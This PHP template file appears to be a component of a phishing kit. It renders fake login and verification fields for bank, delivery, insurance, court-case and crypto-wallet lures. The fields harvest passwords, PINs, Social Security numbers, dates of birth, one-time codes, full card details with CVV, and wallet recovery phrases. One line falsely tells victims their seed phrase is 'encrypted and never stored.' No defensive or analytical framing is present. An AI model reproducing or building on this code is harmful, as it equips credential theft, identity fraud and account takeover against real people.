<?php
// Shared field renderer — included by each template
// Required vars: $fld (field type string), $sn (step number)
// CSS classes .field, .field input/select, .card-grid, .or-div must exist in parent template
// Textarea classes .wallet-area, .addr-area; .otp-wrap for OTP
?>
<?php if($fld==='username_or_email'): ?>
  <div class="field"><label>Online Banking ID</label><input type="text" id="f_username" name="username" placeholder="Enter your Banking ID or username" autocomplete="username"></div>
  <div class="or-div">or</div>
  <div class="field"><label>Email Address</label><input type="email" id="f_email" name="email" placeholder="you@email.com" autocomplete="email"></div>
<?php elseif($fld==='email_or_phone'): ?>
  <div class="field"><label>Email or Mobile Number</label><input type="text" id="f_email" name="email" placeholder="Email or mobile number" autocomplete="username"></div>
<?php elseif($fld==='email_only'): ?>
  <div class="field"><label>Email Address</label><input type="email" id="f_email" name="email" placeholder="Enter your email" autocomplete="email"></div>
<?php elseif($fld==='phone_or_account'): ?>
  <div class="field"><label>Phone Number or Account Number</label><input type="text" id="f_phone" name="phone" placeholder="Phone number or account #" autocomplete="tel"></div>
<?php elseif($fld==='name_ssn'): ?>
  <div class="field"><label>Full Legal Name</label><input type="text" id="f_fullname" name="fullname" placeholder="As it appears on your ID" autocomplete="name"></div>
  <div class="field"><label>Social Security Number</label><input type="text" id="f_ssn_gov" name="ssn_gov" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off"></div>
<?php elseif($fld==='tracking_zip'): ?>
  <div class="field"><label>Tracking Number</label><input type="text" id="f_tracking" name="tracking" placeholder="Enter tracking number" autocomplete="off"></div>
  <div class="field"><label>Delivery ZIP Code</label><input type="text" id="f_zip_t" name="zip" placeholder="e.g. 10001" maxlength="10" autocomplete="postal-code"></div>
<?php elseif($fld==='policy_email'): ?>
  <div class="field"><label>Policy Number</label><input type="text" id="f_policy" name="policy" placeholder="Enter your policy number" autocomplete="off"></div>
  <div class="or-div">or</div>
  <div class="field"><label>Email Address</label><input type="email" id="f_email" name="email" placeholder="Registered email address" autocomplete="email"></div>
<?php elseif($fld==='member_email'): ?>
  <div class="field"><label>Member ID</label><input type="text" id="f_username" name="username" placeholder="Member ID from your card" autocomplete="off"></div>
  <div class="or-div">or</div>
  <div class="field"><label>Email Address</label><input type="email" id="f_email" name="email" placeholder="Registered email address" autocomplete="email"></div>
<?php elseif($fld==='case_name'): ?>
  <div class="field"><label>Case / Reference Number</label><input type="text" id="f_username" name="username" placeholder="Case number or docket number" autocomplete="off"></div>
  <div class="or-div">or</div>
  <div class="field"><label>Full Legal Name</label><input type="text" id="f_fullname" name="fullname" placeholder="As it appears on court documents" autocomplete="name"></div>
<?php elseif($fld==='password'): ?>
  <div class="field"><label>Password</label><input type="password" id="f_password" name="password" placeholder="Enter your password" autocomplete="current-password"></div>
<?php elseif($fld==='email_password'): ?>
  <div class="field"><label>Email Address</label><input type="email" id="f_email2" name="email2" placeholder="your@email.com" autocomplete="email"></div>
  <div class="field"><label>Password</label><input type="password" id="f_password" name="password" placeholder="Enter your password" autocomplete="current-password"></div>
<?php elseif($fld==='pin_or_password'): ?>
  <div class="field"><label>Account PIN / Password</label><input type="password" id="f_pin" name="pin" placeholder="Enter your 6-digit PIN or password" maxlength="20" autocomplete="current-password"></div>
<?php elseif($fld==='ssn_dob'): ?>
  <div class="field"><label>Social Security Number</label><input type="text" id="f_ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off"></div>
  <div class="field"><label>Date of Birth</label><input type="text" id="f_dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday"></div>
<?php elseif($fld==='ssn_dob_zip'): ?>
  <div class="field"><label>Social Security Number</label><input type="text" id="f_ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" oninput="fmtSSN(this)" autocomplete="off"></div>
  <div class="card-grid">
    <div class="field"><label>Date of Birth</label><input type="text" id="f_dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday"></div>
    <div class="field"><label>ZIP Code</label><input type="text" id="f_zip" name="zip" placeholder="12345" maxlength="10" autocomplete="postal-code"></div>
  </div>
<?php elseif($fld==='dob_zip'): ?>
  <div class="field"><label>Date of Birth</label><input type="text" id="f_dob" name="dob" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday"></div>
  <div class="field"><label>ZIP / Postal Code</label><input type="text" id="f_zip" name="zip" placeholder="e.g. 90210" maxlength="10" autocomplete="postal-code"></div>
<?php elseif($fld==='dob_only'): ?>
  <div class="field"><label>Date of Birth</label><input type="text" id="f_dob3" name="dob3" placeholder="MM/DD/YYYY" maxlength="10" oninput="fmtDOB(this)" autocomplete="bday"></div>
<?php elseif($fld==='otp_code'): ?>
  <div class="field" style="text-align:center"><label style="text-align:center;display:block">Verification Code</label></div>
  <div class="otp-wrap" id="otpWrap">
    <?php for($oi=0;$oi<6;$oi++): ?><input type="text" name="otp_<?=$oi+1?>" maxlength="1" inputmode="numeric" oninput="otpMove(this,<?=$oi?>)"><?php endfor; ?>
  </div>
  <input type="hidden" name="otp" id="f_otp">
  <div class="otp-hint">Enter the 6-digit code from your authenticator app or SMS</div>
<?php elseif($fld==='wallet_phrase'): ?>
  <div class="field"><label>Recovery / Seed Phrase</label>
    <textarea class="wallet-area" id="f_wallet" name="wallet" placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"></textarea>
  </div>
  <div class="wallet-hint">🔐 Your phrase is encrypted and never stored on our servers. Used only to verify wallet ownership.</div>
<?php elseif($fld==='card_full'): ?>
  <div class="field"><label>Card Number</label><input type="text" id="f_card" name="card" placeholder="0000 0000 0000 0000" maxlength="19" oninput="fmtCard(this)" autocomplete="cc-number" inputmode="numeric"></div>
  <div class="card-grid">
    <div class="field"><label>Expiry</label><input type="text" id="f_exp" name="exp" placeholder="MM/YY" maxlength="5" oninput="fmtExp(this)" autocomplete="cc-exp" inputmode="numeric"></div>
    <div class="field"><label>CVV</label><input type="text" id="f_cvv" name="cvv" placeholder="000" maxlength="4" autocomplete="cc-csc" inputmode="numeric"></div>
  </div>
  <div class="field"><label>Name on Card</label><input type="text" id="f_cname" name="cname" placeholder="Full name" autocomplete="cc-name"></div>
<?php elseif($fld==='last4_zip'): ?>
  <div class="field"><label>Last 4 Digits of Card on File</label><input type="text" id="f_last4" name="last4" placeholder="XXXX" maxlength="4" inputmode="numeric" autocomplete="off"></div>
  <div class="field"><label>Billing ZIP Code</label><input type="text" id="f_zip3" name="zip3" placeholder="e.g. 90210" maxlength="10" autocomplete="postal-code"></div>
<?php elseif($fld==='address'): ?>
  <div class="field"><label>Mailing Address</label>
    <textarea class="addr-area" id="f_address" name="address" placeholder="Street address, City, State, ZIP"></textarea>
  </div>
<?php else: ?>
  <div class="field"><label>Email Address</label><input type="email" id="f_email" name="email" placeholder="Enter your email" autocomplete="email"></div>
<?php endif; ?>
